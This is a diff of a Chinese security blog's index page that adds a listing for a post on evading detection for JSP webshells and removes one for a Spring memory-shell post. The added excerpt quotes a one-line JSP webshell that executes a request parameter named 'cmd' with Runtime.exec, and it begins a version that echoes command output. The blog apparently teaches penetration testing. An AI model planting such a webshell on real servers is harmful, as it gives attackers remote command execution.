@@ -167,6 +167,73 @@
   <div class="post-item">
     
     <div class="post-item-info">
+      <a class="post-title" href="/2022/04/22/bypassJsp/" title="Jsp Webshell免杀 ">
+        
+        Jsp Webshell免杀
+        
+      </a>
+      <div class="post-description">
+        
+        前言之前只会写最简单webshell，今天来不系统地学习一下Jsp的webshell的免杀方式一句话Webshell从一句话木马角度来说，最简单的应该是&amp;lt;%Runtime.getRuntime().exec(request.getParameter(&amp;quot;cmd&amp;quot;));%&amp;gt;直接调用了Runtime的exec方法，并且不进行回显，适用于反弹shell，但是就没法进行一些其他的操作，并且是个WAF都会拦如果说需要加上回显，应该写成如下&amp;lt;%@pageimport=&amp;quot;java.io.InputStream&amp;quot;%&amp;gt;&amp;lt;%@pageimport=&amp;quot;java.io.InputStreamReader&amp;quot;%&amp;gt;&amp;lt;%@pageimport=&amp;quot;java.io.BufferedReader&amp;quot;%&amp;gt;&amp;lt;%@pagelanguage=&amp;quot;java&amp;quot;pageEncoding=&amp;quot;UTF-8&amp;quot;%&amp;gt;&amp;lt;%Runtimert=Runtime.getRu...
+      </div>
+      <div class="post-meta-wrap">
+        <span class="post-meta-date">
+          <i class="far fa-calendar-alt"></i>
+          <span>发表于 </span>
+          <span>
+            2022-04-22
+          </span>
+        </span>
+        
+
+        
+        <span class="post-tag">
+          <i class="fa fa-tag"></i>
+          
+          <a href="/tags/web%E5%AE%89%E5%85%A8/">
+            web安全
+          </a>
+          
+          <i class="fas fa-angle-right"></i>
+          
+          
+          <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+            代码审计
+          </a>
+          
+          <i class="fas fa-angle-right"></i>
+          
+          
+          <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+            渗透测试
+          </a>
+          
+          <i class="fas fa-angle-right"></i>
+          
+          
+          <a href="/tags/Java%E5%AE%89%E5%85%A8/">
+            Java安全
+          </a>
+          
+          <i class="fas fa-angle-right"></i>
+          
+          
+          <a href="/tags/%E5%85%8D%E6%9D%80/">
+            免杀
+          </a>
+          
+          
+        </span>
+        
+      </div>
+    </div>
+
+  </div>
+  
+  
+  <div class="post-item">
+    
+    <div class="post-item-info">
       <a class="post-title" href="/2022/04/21/JavaRMI4/" title="Java中JNDI,RMI,LDAP那些事(四) ">
         
         Java中JNDI,RMI,LDAP那些事(四)
@@ -619,59 +686,6 @@
           
           <a href="/tags/Java%E5%AE%89%E5%85%A8/">
             Java安全
-          </a>
-          
-          
-        </span>
-        
-      </div>
-    </div>
-
-  </div>
-  
-  
-  <div class="post-item">
-    
-    <div class="post-item-info">
-      <a class="post-title" href="/2022/04/09/Spring_memory_shell/" title="Spring内存马合集 ">
-        
-        Spring内存马合集
-        
-      </a>
-      <div class="post-description">
-        
-        前言前面学了Tomcat的Servlet和Filter内存马，然后学了几天的spring，审了一个程序，就继续顺便把内存马的东西弄完吧。前面说到Servlet和Filter内存马其实都是在配置文件中注册一个Servlet或者Filter，因为他们的生命周期是到服务器结束才结束。其实Spring的controller的内存马也是如此，也是注册一个Controller来实现。因此我们需要了解SpringMVC中Controller注册的流程。Controller注册流程SpringMVC初始化时，在bean的构造方法以及设置属性之后会使用InitializingBean#afterPropertiesSet进行Bean的初始化操作，实现类RequestMappingHandlerMapping用来处理具有@Controller注解类中的方法级别的@RequestMapping以及RequestMappingInfo实例的创建，AbstractHandlerMapping是RequestMappingHandlerMapping的父类，并且AbstractHandlerMapping实...
-      </div>
-      <div class="post-meta-wrap">
-        <span class="post-meta-date">
-          <i class="far fa-calendar-alt"></i>
-          <span>发表于 </span>
-          <span>
-            2022-04-09
-          </span>
-        </span>
-        
-
-        
-        <span class="post-tag">
-          <i class="fa fa-tag"></i>
-          
-          <a href="/tags/web%E5%AE%89%E5%85%A8/">
-            web安全
-          </a>
-          
-          <i class="fas fa-angle-right"></i>
-          
-          
-          <a href="/tags/Java%E5%AE%89%E5%85%A8/">
-            Java安全
-          </a>
-          
-          <i class="fas fa-angle-right"></i>
-          
-          
-          <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">
-            内存马
           </a>
           
           
